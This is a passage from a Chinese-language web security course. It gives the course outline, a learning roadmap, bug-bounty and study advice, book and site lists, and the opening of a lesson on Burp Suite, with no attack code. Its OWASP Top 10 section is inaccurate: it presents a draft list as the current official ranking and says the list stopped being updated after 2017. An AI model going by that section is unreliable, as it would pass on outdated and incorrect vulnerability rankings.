</figure>

<p>
尽管 Web安全如此重要，但我在面试一些渗透测试岗位的 <b>求职者</b> 时，发现多
数人要么 <b>只懂得利用，不懂得防御</b> ，要么就是 <b>缺乏实战能力</b> 。
</p>

<p>
企业你是想让你来发现和解决安全问题的，如果不懂防御，又如何为企业提供相
应的解决方案呢？更何况Web安全是一项注重实战的技能，如果缺乏实战能力，
到了真被入侵的时候，根本就无法应对。
</p>

<p>
如果你想从事安全行业，或者是想从事前后端开发工作，学习 Web安全知识能让
你更有效地应对入侵问题，甚至是提前做好安全防护，防止安全事件的发生。
</p>

<p>
<b>另外，学习 Web 安全相关的知识，不仅可以帮助你提升自己，还能赚取赏金</b> 。
</p>

<p>
国内外企业都有自建安全响应中心，用于接收外部报告漏洞；然后，依据漏洞危
害等级和质量给予相应的赏金或礼品，比如TSRC（腾讯安全应急响应中心）、
MSRC（微软安全响应中心）。此外也有一些知名的第三方漏洞奖励平台，比如
HackerOne，上面经常会公开一些漏洞案例，非常有学习价值。
</p>

<p>
一开始想赚赏金是有些难度的，因为在上面挖漏洞的白帽子非常多，遇到报告相
同漏洞的情况时（俗称“撞洞”），平台只会把赏金给到最早报告漏洞的人。如
果你没有系统化的Web安全知识，只会用一句弹提示框的语句到处填写输入框，
看是否会弹框，那基本是挖不到漏洞的。
</p>

<p>
我刚开始去国内SRC（安全响应中心）平台赚赏金的时候，有点力不从心，很难
挖到有价值的高危漏洞。我尝试购买了一些相关的书籍，但那些书大多是停留在
理论知识上，没有提供实践操作的方法。后来即便挖到了一些漏洞，当厂商来问
我一些具体的危害和修复建议（有助于提高厂商评估的奖金额度）时，我又经常
答不上来。
</p>
</div>
</div>
<div id="outline-container-课程设计" class="outline-3">
<h3 id="课程设计">课程设计</h3>
<div class="outline-text-3" id="text-课程设计">
<p>
面对这些问题，我确定了本课程的思路，也就是前面我提到的“未知攻，焉知
防”。我将课程分成了 3 个模块，通过工具和方法论介绍、理论分析、案例实
战，从多个维度带你了解 Web 安全，建立完整的 Web 安全知识体系。
</p>

<ul class="org-ul">
<li><b><a href="#orgeefaf4b">模块一，Web攻防基础</a></b> 。这是正式开始前的准备工作，主要介绍了一些常用
的工具，并带你 <b>搭建靶场，避免非法测试他人网站</b> 。通过这一部分的学习，
你可以掌握一些常用的渗透工具和信息收集的方法，帮助你提高测试效率和成
功率；搭建靶场也能让你更好地理解漏洞的产生原理和利用，提高实战能力。</li>

<li><b><a href="#org9da8ba6">模块二，漏洞攻防原理</a></b> 。作为这门课最硬核的部分，在模块一的基础上，
我补充了一些实用的工具和测试方法（例如sqlmap），讲解了各种常见的 Web
漏洞攻防原理，教你进行安全测试，并通过靶场进行演练。通过这一部分的学
习，你可以 <b>了解XSS、SQL 注入、CSRF 等常见 Web漏洞类型的攻击与防御方
法</b> 。只有深入学习这些漏洞攻防技术，才能避免自己成为只会使用工具的
“脚本小子”。</li>

<li><b><a href="#orgc871165">模块三， Web 安全建设</a></b> 。这里介绍的是企业内部对于 Web安全漏洞的防御
方法。 <b>如何更系统、更全面、更早地检测、修复、拦截各种漏洞，防止企业
产品遭受外部利用漏洞进行恶意攻击</b> 是这一模块的重点。业务开发过程中，
避免安全漏洞的产生也是一个非常重要的流程。</li>
</ul>

<p>
通过这一部分的学习，你不仅能保障自己业务产品的正常运行，而且能避免自己
的绩效受到安全事件的影响。业务产品上线后，若是被攻击入侵，也能拥有修复
漏洞和应急处置的能力，这是在工作中表现自己能力的最佳时刻。
</p>

<p>
在这个过程中，我希望“授人以渔”地教授你正确的学习方法，不仅引你入门，
更能让你获得持续的自我提升；同时，我希望通过分析常见的 Web 漏洞类型的
原理、利用、检测与防御，让你能够独立完成渗透测试工作，让你能够帮助企业
更早地发现和修复漏洞，防止被外部攻击入侵。
</p>

<p>
课程中，我还会结合公开的漏洞靶场和 CTF 赛题，通过实例来讲解 Web
安全攻防的方方面面，指导你搭建环境练习，在实践中学习与应用。
</p>
</div>
</div>
<div id="outline-container-讲师寄语" class="outline-3">
<h3 id="讲师寄语">讲师寄语</h3>
<div class="outline-text-3" id="text-讲师寄语">
<p>
入门 Web 安全并不难，难的是如何在实战中不断提升自己，在前人的技术研究
基础上，有所创新和提升。在这门课中，我会带你系统了解安全知识体系，学会
分析和解决 Web 安全相关问题，帮助你胜任更具有挑战性的工作。
</p>

<p>
哪怕你是研发岗，并未在从事安全行业，掌握安全技术，也一定会在将来的某一
时刻发挥作用。 <b>用技术打造自己的核心竞争力，做职业生涯的常青树，做生活
的保护伞，也不失为一种提升职场竞争力，抵御职业风险的有效手段</b> 。
</p>

<p>
相信你只要认真学完本课程，并认真跟着课程进行实战练习，就能够具备独立的
渗透测试能力。如果在学习完本课程后，你刷到了自己的第一笔漏洞奖金，记得
回来分享下，期待你的好消息。
</p>


<figure id="org642f84e">
<img src="./images/CgqCHl_ZuSSANvb4AAVPDVOz1QI029.png" alt="CgqCHl_ZuSSANvb4AAVPDVOz1QI029.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:4bfb3ea8-8dcc-4fd4-921b-5ceb44e0c450" class="outline-2">
<h2 id="h:4bfb3ea8-8dcc-4fd4-921b-5ceb44e0c450">课前导读  如何学习 Web 渗透技术</h2>
<div class="outline-text-2" id="text-h:4bfb3ea8-8dcc-4fd4-921b-5ceb44e0c450">
<p>
你好，我是赢少良。从这一讲开始，我们就进入了 Web安全相关的攻防技术的学
习，希望这个课程能对你有所帮助。
</p>

<p>
在课前导读部分，我想讲一下我个人在学习历程中总结的心得。
</p>
</div>
<div id="outline-container-web-安全学习路线" class="outline-3">
<h3 id="web-安全学习路线">Web 安全学习路线</h3>
<div class="outline-text-3" id="text-web-安全学习路线">
<p>
我们先来看下 Web 所涉及的内容。
</p>

<p>
一般来说，我们常说的 Web 是指网站，其本义是万维网。这个实际涵盖的内容
就很多了，涉及浏览器、服务器运行环境等常出现内存破坏漏洞的应用和系统。
但是在安全行业内，我们通常所说的Web 安全，是指 Web 应用安全，即网站安
全，也包含仅提供后端 CGI服务的应用（供移动 App调用的，无直接的前端网
页），可以简单地分为前端和后端，如下图所示：
</p>


<figure id="org97bdca6">
<img src="./images/CgqCHl_Zr5-ATUhRAAMpS6Rf1Ck851.png" alt="CgqCHl_Zr5-ATUhRAAMpS6Rf1Ck851.png" width="80%">

</figure>

<p>
图 1：Web 相关知识结构
</p>

<p>
平常行业内所说的二进制安全，通常是指内存破坏漏洞、逆向工程、病毒对抗等
涉及二进制数据分析的技术领域。虽然浏览器、Linux系统等也是 Web 领域中的
一个环节，但本课程不涉及二进制安全内容，仍以狭义上的网站安全为主要内容。
</p>

<p>
在学习 Web 安全的过程中，有 3 个阶段。
</p>
</div>
<div id="outline-container-阶段一前端知识学习" class="outline-4">
<h4 id="阶段一前端知识学习">阶段一：前端知识学习</h4>
<div class="outline-text-4" id="text-阶段一前端知识学习">
<p>
前端开发主要就是 HTML、CSS、JavaScript 这 3门语言的学习。
</p>

<p>
在学习前， <b>建议你先了解下 HTTP相关的知识</b> ，掌握它的工作原理、请求方
法、响应头、状态码、内容类型等等。
</p>

<p>
行业内有一本很厚的《HTTP 权威指南》，共 694页，如果从这本书入手其实是
很打击人的，不太推荐，建议你上“<a href="https://www.runoob.com/http/http-tutorial.html">菜鸟教程</a>”学习HTTP 课程（所有本课程中
提及的书或教程，在文末都会整理一份清单给到你）。
</p>

<p>
学完之后，直接用 Chrome 浏览器的检查器（快捷键 F12 或Ctrl+Shift+I）里
的“Network”标签查看 HTTP 请求与响应包数据，如下图所示：
</p>


<figure id="orgd73b30c">
<img src="./images/Cip5yF_Zr76AWiNtAAQSZ-8_J_I002.png" alt="Cip5yF_Zr76AWiNtAAQSZ-8_J_I002.png" width="80%">

</figure>

<p>
图 2：Chrome 浏览器的 HTTP 请求与响应包数据
</p>

<p>
它可以帮助你快速理解 HTTP 的交互原理，并使你有一个直观的认识。个人觉得
这是快速学习 HTTP 的方法，花30~60 分钟就足够了。
</p>

<p>
<b>接下来就是学习HTML+CSS</b> 。学习前端的最好资料就是“<a href="https://www.quanzhanketang.com/default.html">W3school</a>”网站。
</p>

<p>
关于 HTML 与 CSS 的教程链接也在文末附上了。
</p>

<p>
<b>最后就是学习JavaScript</b> 。这是前端开发最精髓的部分，在”菜鸟教程“上
也有免费的教程，你可以边学习边实践。之后，你可以再学习下当前最流行的前
端开发框架 Vue.js（有精力也可以学习下 React、Angular等开发框架），它是
一套构建用户界面的渐进式框架，其自带的和第三方的丰富组件可以帮你快速开
发出漂亮的网页，不用从头开始写代码。
</p>

<p>
关于 Vue.js 的学习资料，推荐“<a href="https://vuejs.bootcss.com/guide">Vue.js中文文档</a>”。“菜鸟教程”上也有，个
人比较喜欢上面的“尝试一下”功能，两套教程均在文末附上链接，记得查看。
</p>

<p>
“菜鸟教程”更适合入门学习，如果你想进一步地学习，尤其是JavaScript，最
好是找两本书进修下。这里推荐《 <b>JavaScript DOM编程艺术</b> 》和
《 <b>JavaScript 高级程序设计</b> 》，记得先看第一本，再看第二本。
</p>
</div>
</div>
<div id="outline-container-阶段二后端知识学习" class="outline-4">
<h4 id="阶段二后端知识学习">阶段二：后端知识学习</h4>
<div class="outline-text-4" id="text-阶段二后端知识学习">
<p>
学完前端，就要来学习后端的知识了。
</p>

<p>
随着 Node.js 的崛起，很多后端也开始用前端语言 JavaScript
来开发后端功能。Node.js 基于 Chrome V8 提供的 JavaScript
运行环境，非常适合前端工程师作为进军后端开发的阶梯。关于 Node.js
教程的链接在文末的“其他资料”一节中已附上。
</p>

<p>
更为传统的后端开发经常是搭配 PHP+MySQL 数据库。以下是 2020 年 W3Tech
对当前 Web 开发技术的调查情况，其结果表明全球 78.8% 的网站使用 PHP
作为服务器后端开发语言。
</p>


<figure id="org344c743">
<img src="./images/CgpVE1_Zr9CANWyzAAU-P_qrIcA458.png" alt="CgpVE1_Zr9CANWyzAAU-P_qrIcA458.png" width="80%">

</figure>

<p>
图 3：2020 年 W3Tech 对当前 Web 开发技术的调查情况
</p>

<p>
鉴于上图，本课程涉及的主要语言是 PHP，很多漏洞示例也是以 PHP 为例，掌握
PHP 基础也是学习本课程的预备知识要求。
</p>

<p>
我在这里推荐《 <b>PHP 和 MySQL Web 开发</b> 》一书，里面讲解了 PHP的方方面
面，而且在第 2 篇中还专门讲解了 MySQL，以及如何用 PHP 与 MySQL交互。
</p>

<p>
现在 Go 以高性能的优势发展得相当快，已经有不少后台开发采用Go，这也是未
来后台开发技术的一大发展趋势。本课程主要以引导入门为主，为了避免课程内
容变得太过复杂，关于Go 的教程就暂不推荐了。
</p>

<p>
学完这一阶段，咱们就可以进入最后一个学习的阶段，也就是本课程的主题：Web
漏洞攻防技术。
</p>
</div>
</div>
<div id="outline-container-阶段三漏洞攻防学习" class="outline-4">
<h4 id="阶段三漏洞攻防学习">阶段三：漏洞攻防学习</h4>
<div class="outline-text-4" id="text-阶段三漏洞攻防学习">
<p>
Web 漏洞包含哪一些主流的漏洞类型，最佳的参考就是 OWASP Top 10，不过它在
2017 年之后就停止更新维护了。以下是当前的官方统计结果，按顺序排名。
</p>

<ol class="org-ol">
<li><b>注入</b> ：SQL、NoSQL 数据库注入，还有命令注入和 LDAP 注入等。</li>

<li><b>失效的身份认证和会话管理</b> ：比如攻击者破解密码、窃取密钥、会话令牌或其他漏洞去冒充他人的身份。</li>

<li><b>跨站脚本（XSS）</b> ：XSS
允许攻击者在受害者的浏览器上执行恶意脚本，从而劫持用户会话、钓鱼欺骗等等。</li>

<li><b>失效的访问控制</b> ：比如越权访问其他用户的个人资料、查看敏感文件、篡改数据等。</li>

<li><b>安全配置错误</b> ：比如服务器的不安全配置，导致敏感信息泄露。</li>

<li><b>敏感信息泄露</b> ：比如账号密码未加密存储、敏感数据传输时未加密保护，最终造成数据泄露。</li>

<li><b>攻击检测与防护不足</b> ：比如WAF、主机入侵检测等防御系统部署不全，这
块偏向漏洞防御本身。</li>

<li><b>跨站请求伪造（CSRF）</b> ：攻击者诱使其他登录用户访问恶意站点，以冒用对方的身份执行一些敏感操作。</li>

<li><b>使用含有已知漏洞的组件</b> ：比如一些第三方的开源库、框架等，尤其是已
公开漏洞的旧版本，比如名燥一声的Struts2 漏洞，因频繁出现漏洞被许多
开发者弃用。</li>

<li><b>未受有效保护的 API</b> ：比如浏览器和移动 App 中的 JavaScript API，
常常因其提供的特殊功能未受有效保护而被滥用，造成不同等级的危害程度。</li>
</ol>

<p>
OWASP Top 10 也不完全属于具体的 Web 漏洞类型，比如第 7、9点，但其他涉
及的主流漏洞类型，我在本课程中大多会讲到，比如 SQL注入、XSS、CSRF。
</p>

<p>
只有真正掌握了这些 Web 漏洞相关的安全技术，才能算是入门了 Web安全领域，
为你将来求职、刷榜漏洞奖励计划奠定基础。
</p>

<p>
关于这阶段的学习，除了本课程的内容外，还可以系统地学习下这两本书：
<b>《黑客攻防技术宝典：Web实战篇》</b> 和 <b>《白帽子讲 Web安全》</b> 。这是个人
认为在深度和广度上都有所兼顾的书籍，非常适合 Web安全的入门。另外也有一
本叫 <b>《Web安全测试》</b> 的书籍，这本更偏向实战，里面介绍了不少渗透测试
的技巧和工具，在你理解了常见Web 漏洞类型后，可以将其作为实战参考手册。
</p>
</div>
</div>
</div>
<div id="outline-container-学习技巧" class="outline-3">
<h3 id="学习技巧">学习技巧</h3>
<div class="outline-text-3" id="text-学习技巧">
<p>
了解了 Web安全学习的路线后，你也就知道了学习的方向，那我们应该怎样去学
习呢？
</p>

<p>
常言道“学以致用”，但在注重实践的计算机科学领域，有时“ <b>用以致学</b> ”
可能效果更佳。换句话说，就是带着实际的应用目的去学习。我列举了以下6 个
场景，你可以带着这些目的去学习。
</p>
</div>
<div id="outline-container-面向岗位学习" class="outline-4">
<h4 id="面向岗位学习">面向岗位学习</h4>
<div class="outline-text-4" id="text-面向岗位学习">
<p>
你毕业后肯定得找工作，如果你想从事安全工作，这关是免不了，除非你家里有矿，那当我没说。
</p>

<p>
对于面向岗位的学习，你可以直接上招聘网站查找相关岗位的招聘要求，比如在拉勾网搜索“Web
安全”，然后挑选自己感兴趣的公司，比如腾讯或 360，然后查看其岗位描述：
</p>


<figure id="org1be65ed">
<img src="./images/CgpVE1_Zr-WAMAhNAAFcqtWjIv0666.png" alt="CgpVE1_Zr-WAMAhNAAFcqtWjIv0666.png" width="80%">

</figure>

<p>
图 4：招聘信息来源拉勾网
</p>

<p>
关键在于“ <b>任职要求</b> ”，一般招聘信息里面都会有“职位描述”和“任职要
求”或“岗位要求”的信息，“任职要求”里面与技术相关要求就是你要学习的
方向。比如上图360 的招聘信息，总结下技术要求就是： <b>熟悉 Web漏洞攻防*、
*工具实战</b> 、 <b>开发能力</b> 。
</p>

<p>
这几块能力要求在本课程中都会涉及，但主要还是集中在 Web 漏洞攻防的部分。
这是最主要的要求。其他工具实战在靶场介绍中会涉及，后面也会有一些常见的
渗透测试工具的集合介绍。
</p>

<p>
带着这种求职岗位的要求就可以很容易地找到学习的方向，对未来找工作也有直
接的帮助。
</p>
</div>
</div>
<div id="outline-container-面向赏金学习" class="outline-4">
<h4 id="面向赏金学习">面向赏金学习</h4>
<div class="outline-text-4" id="text-面向赏金学习">
<p>
当前国内SRC（安全响应中心）平台早已是企业标配，各家各户有能力的都在自
建，没能力没条件的就寄托在第三方漏洞平台上。无论是自建的还是寄托在第三
方漏洞平台上的，它们的目的只有一个，那就是收集自家产品漏洞，提高产品安
全性，完善自身检测与防御系统，同时避免被公关炒作。
</p>

<p>
SRC平台会给报告者提供奖品或现金奖励，因此长期吸引着大批白帽子为其测试
网站。国外比较著名的漏洞奖励平台有HackerOne，像微软 Google、Apple也都
有自己的漏洞奖励计划，但因后者都是美金奖励，在汇率的优势下，奖金换算成
人民币，常常价值不低。这也是一些老白帽子更喜欢混迹于国外漏洞奖励平台的
原因。
</p>

<p>
<b>Web漏洞常常都能够直观地危害到网站的安全性</b> 。它们整体上相比二进制漏洞
更容易被利用，危害也就更大。除了像微软、Google、Apple这种集中在二进制
漏洞为主的奖励计划，很多赏金其实都是分给了 Web漏洞，比如 SRC、
HackerOne。
</p>

<p>
你可以 <b>根据漏洞奖励计划中提供的网站范围，有针对性地进行安全测试，然后
将发现的漏洞报给平台换取赏金</b> 。这种以赏金为驱动力的学习方式，对于在校
生特别有诱惑力。他们可以通过赏金购买书籍、电子产品进一步学习，然后挖掘
更多漏洞，赚取更多赏金，将学习转变为主动学习，构造出良性特征的学习动力。
</p>

<p>
采用面向赏金的学习方法，不仅可以提高自身的漏洞实战能力，而且还可以赚取
赏金，何乐而不为？
</p>
</div>
</div>
<div id="outline-container-面向工具学习" class="outline-4">
<h4 id="面向工具学习">面向工具学习</h4>
<div class="outline-text-4" id="text-面向工具学习">
<p>
GitHub 上经常开源一些优秀的安全工具，在 Web 安全领域，以 sqlmap最为著
名。整个项目非常工程化，表现能力也非常优秀。 <b>它采用 Python开发，通过
阅读 sqlmap 源码，对研究 SQL 注入漏洞有很大的帮助</b> 。
</p>

<p>
其他的还有一些漏洞靶场，除了实战测试，也可以通过源码了解是什么样的代码
导致的漏洞，避免自己在未来开发中遇到。
</p>

<p>
一些优秀的开源工具，常会提供一些不错的漏洞检测和利用的方向，及时掌握相
关技术，有助于自身技术的与时俱进，避免落后于技术发展。
</p>
</div>
</div>
<div id="outline-container-面向漏洞学习" class="outline-4">
<h4 id="面向漏洞学习">面向漏洞学习</h4>
<div class="outline-text-4" id="text-面向漏洞学习">
<p>
在国外有词叫 Variant Analysis，直译过来叫“ <b>变异分析</b> ”，意思是 <b>通
过历史漏洞学习和研究，从而挖掘出类似产品中更多相似的漏洞</b> 。尤其是同一
款产品下，如果开发写出了一个漏洞，那么在其他地方出现同一类漏洞的概率就
比较大。
</p>

<p>
乌云网已经成为历史，但其遗留下的漏洞案例是一笔不错的财富。网上也有人搭
建了乌云镜像提供相关的漏洞、知识库的检索，你可以点击<a href="https://wooyun.x10sec.org/">链接</a>查看。
</p>

<p>
HackerOne 通常在漏洞修复后的 3个月会公开漏洞细节，栏目名叫
“<a href="https://hackerone.com/hacktivity">Hacktivity</a>”，它提供RSS 订阅，可以非常方便地关注。
</p>


<figure id="org70e6adc">
<img src="./images/Ciqc1F_ZsIyAXEQjAANXYn70e8c897.png" alt="Ciqc1F_ZsIyAXEQjAANXYn70e8c897.png" width="80%">

</figure>

<p>
图 5：Hacktivity
</p>

<p>
说到漏洞库就不得不提 Exploit-db，其中有着丰富的漏洞细节和利用代码。
2014年那时还是一个叫 milw00rm 的漏洞库为主流，milw00rm 不再维护后，所
有漏洞信息都被并入了 Exploit-db。至今，Exploit-db还在正常运营，其背后
的团队正是打造了著名黑客系统 Kali 的Offensive-Security安全公司，是一家
专门从事安全培训和渗透测试服务的提供商。
</p>


<figure id="orgcd7438b">
<img src="./images/Cip5yF_ZsJiAAv-dAASNGdT-lWY809.png" alt="Cip5yF_ZsJiAAv-dAASNGdT-lWY809.png" width="80%">

</figure>

<p>
图 6：Exploit-db
</p>

<p>
这种通过漏洞学习漏洞的方式，除了加深对漏洞的理解，还可以提高漏洞挖掘的
产出，是一种十分有效地学习方式。
</p>
</div>
</div>
<div id="outline-container-面向大牛学习" class="outline-4">
<h4 id="面向大牛学习">面向大牛学习</h4>
<div class="outline-text-4" id="text-面向大牛学习">
<p>
在你感兴趣的安全领域里，通常都有一些大牛，你可以去收集他们发表的论文、
文章、大会议题，关注他们的微博、公众号、Twitter、GitHub、博客等社交平
台账号，去了解他们的技术成长路线。
</p>

<p>
这种学习方法，前期以模仿为主，参考他们的学习方法、技术文章，把握行业技
术趋势；后期是在入门之后，有了一定的技术积累，就可以开始在前人的基础上
自主研究技术、创新技术，这是比较难的一个阶段，但突破后，你在技术上将会
有质的飞跃。
</p>
</div>
</div>
<div id="outline-container-关注安全动态" class="outline-4">
<h4 id="关注安全动态">关注安全动态</h4>
<div class="outline-text-4" id="text-关注安全动态">
<p>
技术发展非常迅速，一不留眼你就落后了，所以要避免闭门造车，比如诺基亚的
塞班、微软的Windows Mobile，现在都退出了历史舞台，如果你之前不关注这些，
还在埋头研究它们的安全性，那就有点浪费时间了。
</p>

<p>
你可以关注一些技术资讯网站、公众号、Twitter、Github、博客、RSS订阅集合，
国内外安全大会（工业界顶会：BlackHat、Defcon、CanSecWest、OffensiveCon，
学术界顶会：CCS、NDSS、Oakland S&amp;P、USENIX Security），以及 CTF比赛等。
这些都可以帮你了解安全动态的途径。
</p>

<p>
在文末的“网站推荐”中，我已经整理一份清单，建议你采用 RSS订阅的方式关
注，手机上装个 RSS 订阅客户端，比如Inoreader、Feedly、深蓝阅读，一有更
新就可以立马感知到，非常方便。
</p>
</div>
</div>
</div>
<div id="outline-container-学习资料清单" class="outline-3">
<h3 id="学习资料清单">学习资料清单</h3>
<div class="outline-text-3" id="text-学习资料清单">
<p>
除了上面提到的书籍和相关资料，此处还做了一些补充，供你学习参考。
</p>
</div>
<div id="outline-container-书籍清单" class="outline-4">
<h4 id="书籍清单">书籍清单</h4>
<div class="outline-text-4" id="text-书籍清单">
<ol class="org-ol">
<li>《JavaScript DOM 编程艺术》：<a href="https://item.jd.com/10603153.html">https://item.jd.com/10603153.html</a></li>

<li>《JavaScript 高级程序设计》：<a href="https://item.jd.com/12958580.html">https://item.jd.com/12958580.html</a></li>

<li>《PHP 和 MySQL Web开发》：<a href="https://item.jd.com/10059047.html?">https://item.jd.com/10059047.html</a></li>

<li>《黑客攻防技术宝典：Web实战篇》：<a href="https://item.jd.com/11020022.html">https://item.jd.com/11020022.html</a></li>

<li>《白帽子讲 Web 安全》：<a href="https://item.jd.com/11483966.html">https://item.jd.com/11483966.html</a></li>

<li>《Web 安全测试》：<a href="https://item.jd.com/10021008335997.html">https://item.jd.com/10021008335997.html</a></li>

<li>《Web 前端黑客技术揭秘》：<a href="https://item.jd.com/11181832.html">https://item.jd.com/11181832.html</a></li>

<li>《SQL 注入攻击与防御》：<a href="https://item.jd.com/12369984.html">https://item.jd.com/12369984.html</a></li>

<li>网络安全从业者书单推荐：<a href="https://github.com/riusksk/secbook">https://github.com/riusksk/secbook</a></li>
</ol>
</div>
</div>
<div id="outline-container-网站推荐" class="outline-4">
<h4 id="网站推荐">网站推荐</h4>
<div class="outline-text-4" id="text-网站推荐">
<ol class="org-ol">
<li>FreeBuf：<a href="https://www.freebuf.com/">https://www.freebuf.com</a></li>

<li>安全客：<a href="https://www.anquanke.com/">https://www.anquanke.com</a></li>

<li>Seebug Paper：<a href="https://paper.seebug.org/">https://paper.seebug.org</a></li>

<li>安全 RSS 订阅：<a href="http://riusksk.me/media/riusksk_RSS_20190330.xml">http://riusksk.me/media/riusksk_RSS_20190330.xml</a></li>

<li>CTFTime Writeups：<a href="https://ctftime.org/writeups">https://ctftime.org/writeups</a></li>

<li>安全脉搏：<a href="https://www.secpulse.com/">https://www.secpulse.com</a></li>

<li>SecWiki：<a href="https://www.sec-wiki.com/">https://www.sec-wiki.com</a></li>

<li>玄武每日安全：<a href="https://sec.today/pulses/">https://sec.today/pulses</a></li>

<li>学术论文检索：<a href="https://arxiv.org/search/cs">https://arxiv.org/search/cs</a></li>

<li>Exploit-db：<a href="https://www.exploit-db.com/">https://www.exploit-db.com</a></li>

<li>Github：<a href="https://github.com/">https://github.com</a></li>

<li>信息安全知识库：<a href="https://vipread.com/">https://vipread.com</a></li>

<li>先知社区：<a href="https://xz.aliyun.com/">https://xz.aliyun.com</a></li>
</ol>
</div>
</div>
<div id="outline-container-其他资料" class="outline-4">
<h4 id="其他资料">其他资料</h4>
<div class="outline-text-4" id="text-其他资料">
<ol class="org-ol">
<li>HTTP 教程：<a href="https://www.runoob.com/http/http-tutorial.html">https://www.runoob.com/http/http-tutorial.html</a></li>

<li>HTML 教程：<a href="https://www.quanzhanketang.com/default.html">https://www.quanzhanketang.com/default.html</a></li>

<li>CSS 教程：<a href="https://www.runoob.com/css/css-tutorial.html">https://www.runoob.com/css/css-tutorial.html</a></li>

<li>JavaScript 教程：<a href="https://www.runoob.com/js/js-tutorial.html">https://www.runoob.com/js/js-tutorial.html</a></li>

<li>Vue.js 教程：<a href="https://www.runoob.com/vue2/vue-tutorial.html">https://www.runoob.com/vue2/vue-tutorial.html</a></li>

<li>Vue.js中文文档：<a href="https://vuejs.bootcss.com/guide/">https://vuejs.bootcss.com/guide</a></li>

<li>Node.js 教程：<a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">https://www.runoob.com/nodejs/nodejs-tutorial.html</a></li>

<li>HackerOne Hacktivity：<a href="https://hackerone.com/hacktivity">https://hackerone.com/hacktivity</a></li>

<li>乌云公开漏洞、知识库搜索：<a href="https://wooyun.x10sec.org/">https://wooyun.x10sec.org</a></li>

<li>1000 个 PHP 代码审计案例：<a href="https://github.com/Xyntax/1000php">https://github.com/Xyntax/1000php</a></li>

<li>知道创宇研发技能表：<a href="https://blog.knownsec.com/Knownsec_RD_Checklist/index.html">https://blog.knownsec.com/Knownsec_RD_Checklist/index.html</a></li>
</ol>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲主要学习的是 Web安全的初衷：未知攻，焉知防。如果不能掌握黑客常用
的攻击手法，又如何做好防御呢？在Web安全的学习路线上，你可以按照前端、
后端、漏洞的顺序进行。前后端的开发基础已在文中附上相关的学习资料，你可
以按顺序学习。
</p>


<figure id="org621742f">
<img src="./images/Ciqc1F_ZuQGAS7JWAAT7AnN4Trc001.png" alt="Ciqc1F_ZuQGAS7JWAAT7AnN4Trc001.png" width="80%">

</figure>

<p>
除了学习路线、学习资料，我还给你介绍几种比较实用的学习技巧，目的是想引
导你用以致学，带着目标，以主动的心态来学习本课程。主动学习比被动学习的
收益效果高，你可以多与人交流讨论、实践，甚至可以传授他人。
</p>

<p>
如果你在学习方法和资料上有其他更好的推荐，欢迎在留言区分享。
</p>

<p>
最后附上一张学习金字塔给你：
</p>


<figure id="org95cad3f">
<img src="./images/Ciqc1F_ZsMGAWgtqAAGy-RVd1fc687.png" alt="Ciqc1F_ZsMGAWgtqAAGy-RVd1fc687.png" width="80%">

</figure>

<p>
图 7：学习金字塔
</p>

<p>
<a id="orgeefaf4b"></a>
</p>
<blockquote>
<p>
<b>模块一，Web攻防基础</b> 
</p>
</blockquote>
</div>
</div>
</section>
<section id="outline-container-h:8a0530e8-4023-46bb-8103-6c69777cd4d1" class="outline-2">
<h2 id="h:8a0530e8-4023-46bb-8103-6c69777cd4d1">武器库：常用的渗透测试工具</h2>
<div class="outline-text-2" id="text-h:8a0530e8-4023-46bb-8103-6c69777cd4d1">
<p>
你好，我是赢少良。这一讲，我来介绍一些常用的 Web渗透测试工具。通常每个
安全人员都有自己熟练使用的一套工具，这样在实战中才能高效，也不用浪费时
间去自己重复造轮子。
</p>
</div>
<div id="outline-container-白帽子最喜欢用什么安全工具" class="outline-3">
<h3 id="白帽子最喜欢用什么安全工具">白帽子最喜欢用什么安全工具？</h3>
<div class="outline-text-3" id="text-白帽子最喜欢用什么安全工具">
<p>
2020 年的 HackerOne 黑客报告中，统计过白帽子们最喜欢用的软硬件工具。
</p>


<figure id="org0168bda">
<img src="./images/Ciqc1F_ZsTqAbk1uAAEzMdImnRE617.png" alt="Ciqc1F_ZsTqAbk1uAAEzMdImnRE617.png" width="80%">

</figure>

<p>
图 1 白帽子最喜欢使用的工具统计图
</p>

<p>
从图中可以看到，89% 的白帽子都会使用 Burp Suite 这个 Web应用安全测试工
具，有 39% 会尝试自己写工具，第三名的 Fuzzers是模糊测试工具。再后面主
要是一些代理抓包工具、漏洞扫描器和调试器（用于调试二进制程序居多）。
</p>

<p>
从以上信息中我们也能了解到，涉及 <b>Web渗透的常用工具集中在代理抓包工具
和漏洞扫描器上</b> 。 <b>Burp Suite两者兼具，还有丰富的插件，并集成了很多渗
透测试的常用功能，是手工挖掘漏洞的必备神器</b> 。因此，成为白帽子的最爱也
在情理之中。
</p>

<p>
这一讲我收集整理了一些个人比较常用的工具，有一定的个人爱好偏向，你也可
以根据自己的喜好选择顺手的使用，并不必局限于我列举的工具。
</p>

<p>
这里我主要介绍常用的工具以及在使用上的一些技巧和心得，你可以自己动手安
装尝试一下。在未来的课程中，我会在合适的实践场景讲解相应工具的实战应用，
比如在“第04 讲”将介绍 Nmap，在“第 07 讲”和“第 08 讲”提到“SQL 注
入”时又会应用SQLMap。
</p>

<p>
我比较推荐 <b>从资料的源头入手</b> ，哪怕是英文的原始资料，你自己认真阅读一
遍，肯定好过被别人嚼烂的东西。下面的工具我也会尽量标出原始技术内容来源，
此处不会过多详细地介绍每一样工具的使用，你可以参考文末列出相关的资料清
单，边操作边学习。
</p>
</div>
</div>
<div id="outline-container-burp-suite集成化的-web-应用测试工具" class="outline-3">
<h3 id="burp-suite集成化的-web-应用测试工具">Burp Suite：集成化的 Web 应用测试工具</h3>
<div class="outline-text-3" id="text-burp-suite集成化的-web-应用测试工具">
<p>
我们先来看看白帽子们最喜欢的 Web 应用安全测试工具：Burp Suite。
</p>


<figure id="org0278ee6">
<img src="./images/CgqCHl_ZsUuAF1bFAAIiwmvltps413.png" alt="CgqCHl_ZsUuAF1bFAAIiwmvltps413.png" width="80%">

</figure>

<p>
图 2 Burp Suite
</p>

<p>
Burp Suite分免费的社区版、收费的专业版和企业版。
</p>

<ul class="org-ul">
<li>社区版主要是一些代理抓包改包的基本功能</li>
<li><p>
专业版则包含漏洞扫描器、插件商店、Burp Instruder（比如用来暴力破解账号）等功能。
</p>

<p>
专业版一年收费 399 美元，按当前汇率算，相当于 2637元，也并不便宜；
</p></li>

<li>企业版更贵，要 3999 美元（相当于 26435元），主要增加了一些定期循环漏
洞扫描和 CI持续集成功能，具有更好的扩展性。</li>
</ul>
